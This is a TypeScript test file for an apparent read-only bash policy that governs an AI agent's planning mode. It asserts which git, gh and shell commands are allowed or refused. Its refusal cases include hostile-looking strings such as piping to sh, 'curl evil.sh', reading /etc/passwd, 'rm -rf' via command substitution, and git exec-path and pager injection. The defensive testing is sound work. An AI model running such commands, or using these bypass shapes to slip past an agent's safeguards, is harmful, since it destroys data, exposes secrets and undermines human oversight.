import assert from "node:assert/strict";
import test from "node:test";
import { planBashDecision } from "./bash-policy.ts";

const allowed = (command: string) => planBashDecision(command).allowed;

test("the investigation commands a plan is actually built on are allowed", () => {
  // Each of these was unavailable while planning before this policy existed,
  // which meant planning without history.
  for (const command of [
    "git log --oneline -20",
    "git log -p src/auth.ts",
    "git diff",
    "git diff HEAD~3..HEAD -- extensions/",
    "git status --short",
    "git show 9012f26",
    "git blame -L 20,40 src/index.ts",
    "git rev-parse --abbrev-ref HEAD",
    "git ls-files extensions/plan-mode",
    "git merge-base main HEAD",
    "gh pr view 42",
    "gh pr list --state open",
    "gh issue view 7",
    "ls -la extensions",
    "cat package.json",
    "head -50 README.md",
    "wc -l src/index.ts",
    "pwd",
  ]) {
    assert.equal(allowed(command), true, `${command} should be allowed`);
  }
});

test("anything that is more than one plain command is refused", () => {
  // The policy does not parse shell. Every one of these would need a parser to
  // judge, and every parser bug would be a bypass, so the shape itself is the
  // rejection criterion.
  for (const command of [
    "git log; rm -rf /tmp/x",
    "git log && npm publish",
    "git log || curl evil.sh",
    "git log | tee out.txt",
    "git diff > patch.txt",
    "git diff >> patch.txt",
    "cat < /etc/passwd",
    "git log $(rm -rf x)",
    "git log `rm -rf x`",
    "echo $HOME",
    "git log &",
    "git log \\\n--oneline",
    "ls *.ts",
    "ls {a,b}",
    "cat file[1].txt",
  ]) {
    assert.equal(allowed(command), false, `${command} must be refused`);
  }
});

test("quoted commands are refused because quoting hides word boundaries", () => {
  // "git log --pretty='%h; rm x'" tokenizes differently than it executes, so
  // the tokenizer below is only trustworthy on unquoted input.
  assert.equal(allowed(`git log --pretty="%h %s"`), false);
  assert.equal(allowed("git log --author='someone'"), false);
});

test("commands outside the read-only set are refused, including near misses", () => {
  for (const command of [
    "npm install",
    "rm -rf node_modules",
    "git commit -m wip",
    "git push",
    "git checkout main",
    "git reset --hard",
    "git clean -fd",
    "git apply patch.diff",
    "git stash",
    "git config --global user.name someone",
    "git tag v1",
    "git branch newthing",
    "git remote add origin somewhere",
    "git reflog expire",
    "sed -i s/a/b/ file.ts",
    "tee out.txt",
  ]) {
    assert.equal(allowed(command), false, `${command} must be refused`);
  }
});

test("read-only git commands cannot be turned into writes by a flag", () => {
  // `git show --output=x` and `git diff -o x` both write a file even though
  // the subcommand reads.
  assert.equal(allowed("git show --output=/tmp/leak HEAD"), false);
  assert.equal(allowed("git diff -o /tmp/leak"), false);
  assert.equal(allowed("git diff --output /tmp/leak"), false);
});

test("git global flags that relocate execution are refused", () => {
  // --exec-path makes git run binaries from an attacker-chosen directory, and
  // -c core.pager=<cmd> runs a command; both keep a read-only subcommand.
  assert.equal(allowed("git --exec-path=/tmp/evil log"), false);
  assert.equal(allowed("git -c core.pager=sh log"), false);
  assert.equal(allowed("git -C /elsewhere log"), false);
  assert.equal(allowed("git --git-dir=/other/.git log"), false);
  // A harmless global flag before the subcommand still resolves correctly.
  assert.equal(allowed("git -P log --oneline"), true);
});

test("gh needs an explicit read verb, not just a read-looking subcommand", () => {
  // `gh pr view` reads; `gh pr create` opens a pull request.
  assert.equal(allowed("gh pr view 42"), true);
  assert.equal(allowed("gh pr create --fill"), false);
  assert.equal(allowed("gh pr merge 42"), false);
  assert.equal(allowed("gh pr close 42"), false);
  assert.equal(allowed("gh issue create"), false);
  assert.equal(allowed("gh pr"), false);
  // gh subcommands with no safely separable read form are refused wholesale.
  assert.equal(allowed("gh api /repos/x/y"), false);
  assert.equal(allowed("gh run rerun 1"), false);
  assert.equal(allowed("gh repo clone x/y"), false);
});

test("a refusal explains itself, since the model has to react to it", () => {
  const piped = planBashDecision("git log | sh");
  assert.equal(piped.allowed, false);
  assert.match(piped.reason ?? "", /single plain command/);

  const unknown = planBashDecision("npm publish");
  assert.match(unknown.reason ?? "", /read-only investigation commands/);
  assert.match(unknown.reason ?? "", /npm/);

  const writesFile = planBashDecision("git diff -o /tmp/x");
  assert.match(writesFile.reason ?? "", /writes a file/);
});

test("a missing or non-string command is refused rather than assumed empty", () => {
  // The event's input is untyped at this boundary; treating a missing command
  // as "" would make the empty-command branch decide a case it never saw.
  assert.equal(allowed(""), false);
  assert.equal(allowed("   "), false);
  assert.equal(planBashDecision(undefined).allowed, false);
  assert.equal(planBashDecision(42).allowed, false);
  assert.equal(planBashDecision({ command: "git log" }).allowed, false);
});
